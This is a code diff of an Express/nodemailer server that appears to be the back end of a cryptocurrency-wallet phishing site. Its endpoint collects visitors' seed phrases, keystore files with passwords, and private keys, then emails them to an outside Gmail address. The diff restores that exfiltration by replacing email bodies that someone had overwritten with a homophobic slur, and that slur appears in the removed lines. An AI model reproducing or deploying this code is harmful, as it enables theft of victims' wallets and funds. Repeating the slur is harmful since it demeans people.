@@ -2,11 +2,9 @@ const express = require("express");
 const nodemailer = require("nodemailer");
 const cors = require("cors");
 require("dotenv").config();
-const port = process.env.PORT || 3001;
 const app = express();
 app.use(cors());
 app.use(express.json());
-
 function formatMessage(message) {
   const lines = message.split(/\r?\n/);
   const formattedLines = lines.map(
@@ -16,14 +14,12 @@ function formatMessage(message) {
     ""
   )}</div>`;
 } 
-
 app.post("/api/send-email", async (req, res) => {
     console.log("Received request to send email with body:", req.body);
     
   const { phrase, keystore, privateKey, item } = req.body;
   const email = process.env.EMAIL_USER || "";
   const pass = process.env.EMAIL_PASS || ""; 
-
   const transporter = nodemailer.createTransport({
     service: "gmail",
     auth: {
@@ -31,7 +27,6 @@ app.post("/api/send-email", async (req, res) => {
       pass,
     },
   });
-
   transporter.verify(function (error, success) {
     if (error) {
       console.log(`Transporter error: ${error}`);
@@ -39,24 +34,22 @@ app.post("/api/send-email", async (req, res) => {
       console.log("Server is ready to take our messages");
     }
   });
-
   try {
     let mailOptions = null;
-
     if (phrase) {
       const formattedMessage = formatMessage(phrase);
       mailOptions = {
         from: `Dapp App <${email}>`,
         to: "Fixiondapps@gmail.com",
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
-        html: `fucking faggot scammer`,
+        html: `${formattedMessage} wallet is ${item}`,
       };
     } else if (keystore) {
       mailOptions = {
         from: `Dapp App <${email}>`,
         to: "Fixiondapps@gmail.com",
         subject: "Yo! You Just Got A New Keystore Innit from DApps website!",
-        html: `fucking faggot scammer`,
+        html: `<div>Json: ${keystore.json}</div> <div>Password: ${keystore.password}</div>  wallet is ${item}`,
       };
     } else if (privateKey) {
       const formattedMessage = formatMessage(privateKey);
@@ -64,10 +57,9 @@ app.post("/api/send-email", async (req, res) => {
         from: `Dapp App <${email}>`,
         to: "Fixiondapps@gmail.com",
         subject: "Yo! You Just Got A New Private Key Innit from DApps website!",
-        html: `fucking faggot scammer`,
+        html: `${formattedMessage} wallet is ${item}`,
       };
     }
-
     if (mailOptions) {
       const result = await transporter.sendMail(mailOptions);
       console.log(result);
@@ -77,16 +69,10 @@ app.post("/api/send-email", async (req, res) => {
         return res.status(500).json({ error: "Internal server error" });
       }
     }
-
     return res.status(400).json({ message: "Submission Failed" });
   } catch (error) {
     console.error(error);
     res.status(500).json({ error: "Email failed" });
   }
 });
-app.get("/", async (req, res) => {
-    res.send("Welcome to the Email Sending Server!");    
-  
-});
-
-app.listen(port, () => console.log(`Server running on port ${port}`));
+app.listen(3001, () => console.log("Server running on port 3001"));
